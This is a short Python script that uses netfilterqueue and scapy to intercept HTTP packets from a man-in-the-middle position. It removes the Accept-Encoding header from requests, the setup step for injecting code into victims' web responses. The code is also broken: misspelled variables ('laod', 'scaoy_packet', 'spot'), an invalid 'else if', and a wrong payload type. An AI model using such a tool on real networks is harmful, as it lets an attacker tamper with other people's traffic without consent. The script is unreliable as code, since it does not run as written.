#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, laod):
    packet[scapy.Raw].laod = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.has_layer(scapy.Raw):
        load = scaoy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("Http request")
            modified_load=re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(new_packet)
        else if scapy_packet[scapy.TCP].spot == 80:
            print("Http response")

    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()